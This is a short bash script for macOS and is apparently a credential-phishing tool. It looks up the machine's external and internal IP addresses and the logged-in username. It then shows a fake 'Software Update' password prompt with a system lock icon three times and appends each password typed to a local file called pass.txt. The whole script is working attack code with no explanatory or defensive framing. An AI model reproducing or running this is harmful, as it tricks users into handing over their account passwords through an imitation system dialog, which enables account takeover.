#!/usr/bin/env bash

externalip=$(curl -s http://ipecho.net/plain)
internalip=$(ifconfig en0 | grep inet | awk '$1=="inet" {print $2}')
username=$(scutil <<< "show State:/Users/ConsoleUser" | awk '/Name :/ && ! /loginwindow/ { print $3 }')



read -r -d '' applescriptCode <<'EOF'
   set uservar to do shell script "echo $username"
   set dialogText to text returned of (display dialog "Software Update is trying to authenticate user. Enter the password to allow this." with icon posix file "/System/Library/CoreServices/CoreTypes.bundle/Contents/Resources/LockedIcon.icns" with hidden answer default answer "")
   return dialogText
EOF
dialogText=$(osascript -e "$applescriptCode");

echo $externalip + $internalip + username=$username  password=$dialogText >>  pass.txt;

sleep 1
dialogText=$(osascript -e "$applescriptCode");

echo $externalip + $internalip + username=$username  password=$dialogText >>  pass.txt;

sleep 1
dialogText=$(osascript -e "$applescriptCode");

echo $externalip + $internalip + username=$username  password=$dialogText >>  pass.txt;

